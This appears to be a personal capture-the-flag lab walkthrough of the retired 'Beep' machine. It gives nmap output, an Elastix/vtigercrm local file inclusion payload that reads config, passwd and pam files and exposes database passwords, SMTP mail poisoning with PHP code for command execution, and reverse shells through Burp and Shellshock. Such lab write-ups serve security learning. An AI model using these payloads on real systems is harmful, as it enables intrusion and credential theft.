####nmap results
```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: AUTH-RESP-CODE UIDL RESP-CODES IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) USER TOP STLS EXPIRE(NEVER) PIPELINING APOP
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            874/udp   status
|_  100024  1            877/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CHILDREN CATENATE SORT=MODSEQ LISTEXT ACL NAMESPACE NO QUOTA URLAUTHA0001 UIDPLUS X-NETSCAPE LIST-SUBSCRIBED BINARY ANNOTATEMORE Completed CONDSTORE THREAD=REFERENCES SORT OK IMAP4rev1 THREAD=ORDEREDSUBJECT LITERAL+ IDLE MAILBOX-REFERRALS MULTIAPPEND ATOMIC RIGHTS=kxte UNSELECT ID IMAP4 RENAME STARTTLS
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8
|_SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f
|_ssl-date: 2021-12-19T06:17:21+00:00; +1h00m00s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

```
```
https://10.10.10.7/configs/
nothing here.

So go /admin:

```

![[Screenshot 2021-12-19 at 1.57.20 PM.png]]

```
Poping up login window, try fews defult credentials, no luck, press cancel, brings to https://10.10.10.7/admin/config.php

```

![[Screenshot 2021-12-19 at 2.02.50 PM.png]]

```
Saw 'FreePBX 2.8.1.4'

nothing here, back to the main page, title shows 'Elastix'-- seachsploit elastix
Saw local file inclusion vuln, go inside

searchsploit -x 

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

go to above link, view source:

```

![[Screenshot 2021-12-19 at 2.25.07 PM.png]]

```
there are some credentials, save for further use, since port 20 is avaliable, maybe can try ssh

AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

```

```
anothor thing can try: etc/passwd
and etc/pam.d/passwords-auth
or etc/pam.d/system-auth
```
view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action

view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/pam.d/passwords-auth%00&module=Accounts&action

![[Screenshot 2021-12-19 at 2.29.19 PM.png]]

```saw some username, maybe use hydra to brusforce.```

ssh root@10.10.10.7

```provide the password, then it's root user ''' -- however it didnt work on me. since port 25 is running as well, try telnet ```

telnet 10.10.10.7 25

![[Screenshot 2021-12-19 at 3.08.15 PM.png]]

``` To check if usernaem asterisk a valid user on localhost -- yes it is! ```

``` then try to send a email to the user, with php code as body, works well ```
![[Screenshot 2021-12-19 at 3.10.50 PM.png]]

``` then go to burp, local file inclusion: go to var/html/asterisk, from response can tell the mail was received successfully
```
![[Screenshot 2021-12-19 at 3.12.42 PM.png]]
``` append ipp=whoami to the URL, to test if code executed ```
![[Screenshot 2021-12-19 at 3.14.02 PM.png]]
```in burp, convert the GET request into POST```
![[Screenshot 2021-12-19 at 3.15.45 PM.png]]
``` OK, now send bash reverse shell -- remember to control u to encryt the request ```
![[Screenshot 2021-12-19 at 3.16.47 PM.png]]

``` listen on the port, the shell come back```
![[Screenshot 2021-12-19 at 3.19.42 PM.png]]

3: saw /cgi , webadmin on port 1000, it may vulberable to shellshock

![[Screenshot 2021-12-19 at 3.43.44 PM.png]]

``` put bash reverse shell on user-agent, then set listener on local machine, get the shell back ```

![[Screenshot 2021-12-19 at 3.44.00 PM.png]]